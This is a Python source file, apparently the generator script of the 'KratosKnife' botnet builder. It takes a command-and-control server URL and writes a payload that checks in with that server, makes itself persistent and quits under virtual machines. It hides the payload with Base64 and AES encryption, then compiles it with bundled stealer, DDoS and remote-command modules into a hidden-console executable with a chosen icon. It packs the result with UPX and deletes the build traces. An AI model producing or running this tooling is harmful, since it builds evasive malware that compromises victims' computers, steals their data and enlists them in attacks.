import requests, subprocess, os, shutil, argparse, banners

# Crypter Modules
import crypter.Base64_encrypt as Base64_encrypt
import crypter.AES_encrypt as AES_encrypt

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{RED}KratosKnife v1.0')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
    parser.add_argument("--interactive", dest="interactive", help="Takes Input by asking Questions", action='store_true')   
    parser.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")    
    parser.add_argument("-i", "--interval", dest="interval", help="Time Interval to Connect Server Every __ seconds. default=4", type=int, default=4)
    parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", type=int, default=10)         
    parser.add_argument("-b", "--bind", dest="bind", help="Built-In Binder : Specify Path of Legitimate file.") 
    
    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument("-s", "--server", dest="server", help="Command & Control Server for Botnet.")
    required_arguments.add_argument("-o", "--output", dest="output_exe_name_base", help="Output file name (base name for .exe).")
    return parser.parse_args()

def refine_panelURL(panelURL):
    if panelURL[-1] != "/":
        panelURL = panelURL + "/"

    if panelURL[:7] != "http://" and panelURL[:8] != "https://":
        panelURL = "http://" + panelURL
    
    return panelURL
    
def get_python_pyinstaller_path():
    try:
        # On Windows, 'where python' returns path to python.exe
        python_path_output = subprocess.check_output("where python", shell=True, text=True)
        # Take the first path in case multiple pythons are found
        python_path = python_path_output.strip().split('\n')[0]
        python_path = python_path.replace("\\", "/") # Normalize slashes
        
        # Replace python.exe with Scripts/pyinstaller.exe
        pyinstaller_path = python_path.replace("python.exe", "Scripts/pyinstaller.exe")
        
        if not os.path.exists(pyinstaller_path):
            # Fallback for some installations, e.g., if pyinstaller is directly in Scripts or bin
            pyinstaller_path = python_path.replace("python.exe", "Scripts/pyinstaller")
            if not os.path.exists(pyinstaller_path):
                pyinstaller_path = python_path.replace("python.exe", "bin/pyinstaller")

        if not os.path.exists(pyinstaller_path):
            print(f"{RED}[!] Warning: PyInstaller not found at expected path. Please ensure it's installed and accessible via 'where python' or manually update Generator.py.")
            print(f"{YELLOW}Attempted path: {pyinstaller_path}")
            sys.exit(1)
            
        return pyinstaller_path
    except Exception as e:
        print(f"{RED}[!] Error finding PyInstaller: {e}")
        print(f"{YELLOW}Please ensure Python is in your PATH and PyInstaller is installed. (e.g., pip install pyinstaller)")
        sys.exit(1)

def run_interactive_mode():
    print(f"\n{GREEN}[INTERACTIVE MODE ENABLED]")
    print(f"{YELLOW}\n*********************************************************************")
    
    panelURL = ""
    panel_verified = False
    while not panel_verified:
        panelURL = input(f"{WHITE}\n[?] Enter KartosKnife Command & Control Server URL: {GREEN}")
        panelURL = refine_panelURL(panelURL)

        try:
            check_panel = requests.get(url = panelURL + "check_panel.php", timeout=10)
            
            if(check_panel.text == "Panel Enabled"):
                panel_verified = True
                print(f"{GREEN}[+] Panel Verified Successfully!")
            else:
                print(f"{RED}[!] Panel is disabled or not configured, Please Try Again !")

        except requests.exceptions.RequestException:
            print(f"{RED}[!] Unable to Verify Server URL. Please check your connection or URL and try again.")
            
    output_exe_name_base = input(f"{WHITE}[?] Enter Output File Name (without extension): {YELLOW}")
    icon_path = input(f"{WHITE}[?] Enter Icon File Path (Must be .ico) [LEAVE BLANK TO USE DEFAULT ICON] : {GREEN}")    
    time_persistent = int(input(f"{WHITE}[?] Botnet Becomes Persistence After __ seconds [DEFAULT : 10]: {GREEN}") or "10")
    interval = int(input(f"{WHITE}[?] Time Interval to Connect Server Every __ seconds [DEFAULT : 4]: {GREEN}") or "4")
    print(f"{YELLOW}\n*********************************************************************")
    
    return panelURL, output_exe_name_base, icon_path, time_persistent, interval

def generate_payload(source_py_path, panelURL, time_persistent, interval):
    with open(source_py_path, "w+") as file:
        file.write("import time, sys, requests\n") # Added requests import
        file.write("import KratosKnife as K\n\n")
        file.write(f"def main_payload_loop():\n") # Renamed for robustness, now a loop
        file.write("\twhile True:\n") # Changed to a loop for persistent connection
        file.write("\t\ttry:\n")
        file.write(f"\t\t\tpayload_instance = K.Payload(\"{panelURL}\", {interval})\n") # Pass interval
        file.write(f"\t\t\tpayload_instance.become_persistent({time_persistent})\n")
        file.write(f"\t\t\tpayload_instance.detect_vm_and_quit()\n") 
        file.write(f"\t\t\tpayload_instance.connect()\n") 
        file.write(f"\t\t\tpayload_instance.start()\n") 
        file.write("\t\texcept requests.exceptions.ConnectionError:\n") # Specific connection error
        file.write("\t\t\t# print(\"[\\*] Offline, Trying to Connection After 10 Sec\")\n") # Removed for stealth
        file.write("\t\t\ttime.sleep(10)\n")
        file.write("\t\texcept requests.exceptions.RequestException as e:\n") # Other request errors
        file.write("\t\t\t# print(f\"[Error] : {e}\")\n") # Removed for stealth
        file.write("\t\t\tsys.exit()\n\n") # Exit on unrecoverable request errors
        file.write("\t\texcept KeyboardInterrupt:\n") # For local testing/debugging termination
        file.write("\t\t\tsys.exit()\n\n")
        file.write(f"main_payload_loop()\n")    

def compile_source(source_py_path, icon_path, debugging, output_exe_name_base):
    # PyInstaller will name the output EXE based on the input script's base name unless --name is used
    # We want the output EXE to be named according to output_exe_name_base, so we use --name
    base_command = [PYTHON_PYINSTALLER_PATH, "--onefile", "--hidden-import=KratosKnife", "--hidden-import=Stealer", "--hidden-import=ClientsCMD", "--hidden-import=ComputerCMD", "--hidden-import=HTTPSocket", "--hidden-import=DDOS", "--hidden-import=BypassVM", "--name", output_exe_name_base, source_py_path]
    
    if debugging != "y": # Default is no console
        base_command.append("--noconsole")

    if icon_path and icon_path != "":
        base_command.extend([ "-i", icon_path])

    subprocess.call(base_command, shell=True)

def pack_exe_using_upx(output_exe_name_base):
    original_cwd = os.getcwd()
    upx_source_path = os.path.join(original_cwd, "upx", "upx.exe")
    dist_folder_path = os.path.join(original_cwd, "dist")
    output_exe_path = os.path.join(dist_folder_path, f"{output_exe_name_base}.exe")

    if os.path.exists(upx_source_path) and os.path.exists(output_exe_path):
        shutil.copy2(upx_source_path, dist_folder_path) # Copy upx.exe to dist folder
        os.chdir(dist_folder_path) # Change directory to dist for UPX to find the exe
        
        print(f"{YELLOW}\n[*] Packing Exe Using UPX")
        
        try:
            # Use subprocess.run for better control over output and errors
            subprocess.run(["upx.exe", f"{output_exe_name_base}.exe"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            print(f"{GREEN}[+] Packed Successfully !")
        except subprocess.CalledProcessError as e:
            print(f"{RED}[!] UPX Packing Failed: {e.stderr}")
        except FileNotFoundError:
            print(f"{RED}[!] UPX executable not found in {dist_folder_path}. Packing skipped.")
        finally:
            # Clean up copied upx.exe regardless of success or failure
            if os.path.exists("upx.exe"):
                os.remove("upx.exe")
            os.chdir(original_cwd) # Return to original directory
    else:
        print(f"{RED}[!] UPX (upx.exe) not found at {upx_source_path} or compiled EXE not found at {output_exe_path}. Skipping UPX packing.")

def del_junk_file(source_py_path, output_exe_name_base):
    try:     
        build_path = os.path.join(os.getcwd(), "build")
        if os.path.exists(build_path):
            shutil.rmtree(build_path)
    except Exception:
        pass
    
    try:    
        if os.path.exists(source_py_path):
            os.remove(source_py_path)
        spec_file_path = os.path.join(os.getcwd(), f"{output_exe_name_base}.spec")
        if os.path.exists(spec_file_path):
            os.remove(spec_file_path)
    except Exception:
        pass
    
    try:    
        pycache_path = os.path.join(os.getcwd(), "__pycache__")       
        if os.path.exists(pycache_path):
            shutil.rmtree(pycache_path)                  
    except Exception:
        pass

def exit_greet():
    os.system('cls' if os.name == 'nt' else 'clear')      
    print(GREEN + '''Thank You for using KratosKnife, Think Great & Touch The Sky!  \n''' + END)
    quit()

if __name__ == "__main__":
    dist_folder = os.path.join(os.getcwd(), "dist")
    try:
        shutil.rmtree(dist_folder)
    except Exception:
        pass

    PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path() # Determine path once at start

    arguments = None
    panelURL = ""
    output_exe_name_base = ""
    icon_path = ""
    time_persistent = 10 # Default value
    interval = 4 # Default value
    source_py_path = "" # Initialize here

    try:
        print(banners.get_banner())
        print(f"{YELLOW}Author: {GREEN}Pushpender | {YELLOW}GitHub: {GREEN}github.com/Technowlogy-Pushpender\n")    
    
        arguments = get_arguments()      

        if arguments.interactive:
            panelURL, output_exe_name_base, icon_path, time_persistent, interval = run_interactive_mode() 
            
        if not arguments.interactive:
            if not arguments.server:
                print(f"{YELLOW}\n*******************************************")            
                print(f"{RED}[WARNING] : {YELLOW}You Have Not Defined Server URL")
                print(f"{YELLOW}*******************************************")
                
                panel_verified = False
                while not panel_verified:
                    panelURL = input(f"{WHITE}\n[?] Enter KartosKnife Command & Control Server URL: {GREEN}")
                    panelURL = refine_panelURL(panelURL)

                    try:
                        check_panel = requests.get(url = panelURL + "check_panel.php", timeout=10)
                        
                        if(check_panel.text == "Panel Enabled"):
                            panel_verified = True
                            print(f"{GREEN}[+] Panel Verified Successfully!")
                        else:
                            print(f"{RED}[!] Panel is disabled or not configured, Please Try Again !")

                    except requests.exceptions.RequestException:
                        print(f"{RED}[!] Unable to Verify Server URL. Please check your connection or URL and try again.")
            else:            
                panelURL = arguments.server
                panelURL = refine_panelURL(panelURL)
                        
            if not arguments.output_exe_name_base:
                output_exe_name_base = input(f"{WHITE}[?] Enter Output File Name (without extension): {GREEN}")                
            else: 
                output_exe_name_base = arguments.output_exe_name_base
                
            time_persistent = arguments.time_persistent # Use value from argparse
            interval = arguments.interval # Use value from argparse

            if not arguments.icon:
                icon_path = "" 
                print(f"{YELLOW}\n****************************************************************")            
                print(f"{RED}[WARNING] : {YELLOW}You Have Not Defined BOTNET Icon, Using Default Icon")
                print(f"{YELLOW}****************************************************************")    
            else:
                icon_path = arguments.icon
        
        source_py_path = f"{output_exe_name_base}.py" # Define the temporary Python source file path

        print(f"{YELLOW}\n*********************************************************************")
        print(f"{WHITE}[If payload is unable to execute on Victim PC, Enable Debugging Mode]")
        print(f"{YELLOW}*********************************************************************")
        debugging = input(f"{WHITE}\n[?] Want to Enable Debugging Mode (y/n) [DEFAULT: n]: {GREEN}")
        debugging = debugging.lower()
        
        print(f"{YELLOW}\n[*] Generating Payload Source Codes ...")
        generate_payload(source_py_path, panelURL, time_persistent, interval)  # Generating Payload Source File
        print(f"{GREEN}[+] Payload Source Codes Generated Successfully!")

        key = input(f"{WHITE}\n[?] Enter Weak Numeric Key [Recommended Password Length : 5] : ")
        
        print(f"{YELLOW}\n[*] Initaiting Base64 Encryption Process ...")    
        base64_enc = Base64_encrypt.Encrypt()
        base64_enc.encrypt(source_py_path)
        print(f"{GREEN}[+] Operation Completed Successfully!\n")     

        print(f"{YELLOW}\n[*] Initiating AES Encryption Process ...")
        AES_enc = AES_encrypt.Encryptor(key, source_py_path) 
        AES_enc.encrypt_file()
        print(f"{GREEN}[+] Process Completed Successfully!")
        
        print(f"{YELLOW}\n[*] Compiling Source codes ...{MAGENTA}")
        compile_source(source_py_path, icon_path, debugging, output_exe_name_base)  #Compiling the source code
        
        # Check if output_exe_name_base is set and the compiled exe exists for UPX packing
        if output_exe_name_base and os.path.exists(os.path.join(os.getcwd(), 'dist', f'{output_exe_name_base}.exe')):
                   
            print(f"{GREEN}\n[+] Compiled Successfully !")
            print(f"{GREEN}[+] Evil File is saved at : {YELLOW}dist/{output_exe_name_base}.exe")
            
            pack_exe_using_upx(output_exe_name_base)  # Packing Exe Using UPX Packer
        else:
            # Handle case where output.exe might not be found or output_exe_name_base is missing
            print(f"{RED}[!] Compiled EXE not found at dist/{output_exe_name_base}.exe. Skipping UPX packing.")

        print(f"{YELLOW}\n[*] Deleting Junk Files ...")
        del_junk_file(source_py_path, output_exe_name_base)  
        print(f"{GREEN}[+] Deleted Successfully !")

    except KeyboardInterrupt:  # Catch KeyboardInterrupt first for graceful exit
        if source_py_path and output_exe_name_base: 
            del_junk_file(source_py_path, output_exe_name_base)
        exit_greet()

    except Exception as e:
        if source_py_path and output_exe_name_base:
            del_junk_file(source_py_path, output_exe_name_base)
        print(f"{RED}[!] Error : {YELLOW}{e}")
        quit()